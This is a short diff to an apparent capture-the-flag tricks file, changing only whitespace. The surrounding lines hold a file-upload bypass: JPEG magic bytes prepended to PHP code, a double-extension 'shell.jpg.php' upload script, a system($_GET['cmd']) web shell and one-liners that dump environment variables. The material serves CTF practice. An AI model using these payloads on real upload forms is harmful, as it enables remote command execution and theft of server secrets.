@@ -22,13 +22,13 @@ tricks:
     payload: |
       # JPEG magic number: \xff\xd8
       # Malicious content: \xff\xd8<?php system($_GET['cmd']); ?>
-      
+
       import requests
-      
+
       jpeg_magic = b'\xff\xd8'
       php_code = b'<?php echo getenv("FLAG"); ?>'
       malicious = jpeg_magic + php_code
-      
+
       files = {'userfile': ('shell.jpg.php', malicious, 'image/jpeg')}
       requests.post(url, files=files)
 
@@ -39,4 +39,3 @@ tricks:
       <?php echo getenv("FLAG"); ?>
       <?php echo $_ENV["FLAG"]; ?>
       <?php system("env | grep FLAG"); ?>
-
